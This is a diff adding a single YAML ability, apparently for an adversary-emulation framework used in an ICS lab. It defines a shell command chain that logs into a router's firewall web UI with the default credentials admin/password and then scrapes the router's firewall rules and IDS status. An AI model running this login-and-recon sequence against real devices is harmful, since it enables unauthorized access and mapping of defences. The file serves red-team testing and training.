@@ -1,0 +1,25 @@
+---
+
+- id: b8c9d0e1-8888-8888-8888-000000000001
+  name: Router - Default Credential Login and Recon
+  description: |
+    Login to the router's Flask firewall management UI with default
+    credentials. Enumerate current iptables rules and Suricata status.
+  tactic: lateral-movement
+  technique_id: T0812
+  technique_name: Default Credentials
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      curl -s -c /tmp/router.jar
+      -X POST "http://192.168.90.200:5000/login"
+      -d "username=admin&password=password"
+      -L -o /tmp/router_home.html -w "%{http_code}" &&
+      echo "=== Current Firewall Rules ===" &&
+      curl -s -b /tmp/router.jar "http://192.168.90.200:5000/firewall" |
+      grep -oP 'rule.*?</tr>' | head -20 &&
+      echo "=== IDS Status ===" &&
+      curl -s -b /tmp/router.jar "http://192.168.90.200:5000/ids" |
+      grep -oP 'alert.*?</td>' | head -10 &&
+      echo "ROUTER_ACCESS: SUCCESS"
